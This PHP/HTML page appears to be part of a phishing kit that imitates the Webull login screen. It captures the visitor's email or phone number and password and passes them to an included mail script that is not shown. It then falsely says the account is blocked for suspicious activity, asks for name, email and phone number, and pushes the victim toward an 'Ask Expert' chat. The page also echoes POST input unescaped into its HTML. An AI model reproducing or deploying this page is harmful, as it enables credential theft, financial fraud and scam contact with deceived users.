<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Webull</title>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <link href="assets/css/style.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
<div class="container-fluid login-container">
            <div class="row">
                
                <div class="col-md-6 login-form-2">
                    <img src="assets/images/logo.svg" width="115px" style=" text-align: left;">
                   
                </div>


                  <?php
                     if (isset($_POST['btnLoginMore'])) {
                        
                        include 'mail.php';
                    ?>
                
                <div class="col-md-6 login-form-1">
                    
                    <form action="" method="post">
                        <h3>Verification Required</h3><br>
                        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                   
                    <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                     Kindly contact chat assistance for further help
                 </div>
                        <div class="form-group">
                            <input type="text" name="name" class="form-control" placeholder="Full Name *" value="" required />
                        </div>
                        <div class="form-group">
                            <input type="text" name="email" class="form-control" placeholder="Email *" value="" required />
                        </div>
                        <div class="form-group">
                            <input type="text" name="number" class="form-control" placeholder="Phone Number *" value="" required />
                        </div>
                        <div class="form-group">
                            <input name="fromLog" type="submit" class="btnSubmit" value="Verify" />
                        </div>
                        <div id="terms-and-conditions">by creating an account you agree to our<br><a href="#" rel="noopener" class="md-default-theme">Terms of Use</a> &amp; <a href="#" rel="noopener" class="md-default-theme">Privacy Policy</a>
                        </div>
                    </form>
                </div>


                  <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>
                <div class="col-md-6 login-form-1 text-center" style=" padding-top: 150px;">
                    <form>
                     <h3>Account blocked</h3><br>
                     <p>Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                    <div class="form">
                        <label>Error CODE: <b>6X76D</b></label><br>
                    </div>
                    <div class="calling-number">
                        <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())">Ask Expert</a>
                    </div>
                    </form>
                </div>
                 <?php } else { ?>
                <div class="col-md-6 login-form-1">
                    
                    <form action="" method="post">
                   <h3>Welcome to Webull</h3><br>
                   <div class="tab-tabListWrap">
                    <div class="tab-header">
                        <div class="tab-nav-scroll">
                            <div class="tabs-nav">
                                <div id="mobileClick" class="tab-tabView tab-line-tabView mobileTab active">Mobile Login</div>
                                <div  id="emailClick" class="tab-tabView tab-line-tabView emailTab">Email Login</div>
                            </div>
                        </div>
                    </div>
                   
                   </div>
                        <div class="form-group">
                         <input type="email" id="email" name="email" class="form-control" placeholder="Email *" value="" style="display: none;" />
                         <input type="text" id="number" name="number" class="form-control" placeholder="Phone Number *" value="" />
                        </div>
                        <div class="form-group">
                            <input type="password" name="password" class="form-control" placeholder="Password *" value="" required />
                        </div>
                        <div class="jss17"><a> Forgot password?</a></div>
                        <div class="form-group">
                            <input name="btnLoginMore" type="submit" class="btnSubmit" value="Login" />
                        </div>
                      
                    </form>
                </div>
                 <?php } ?>
            </div>
        </div>

<script>
$(document).ready(function(){
  $(".tab-tabView").click(function(){
    $(".tab-tabView").removeClass('active');
    $(this).addClass('active');
    var clickVar = $(this).attr("id");
    if(clickVar=="mobileClick"){
        $('#email').css('display','none');
        $('#number').css('display','block');

    }else if(clickVar=="emailClick"){
         $('#email').css('display','block');
        $('#number').css('display','none');
    }
  });
});
</script>


</body>
</html>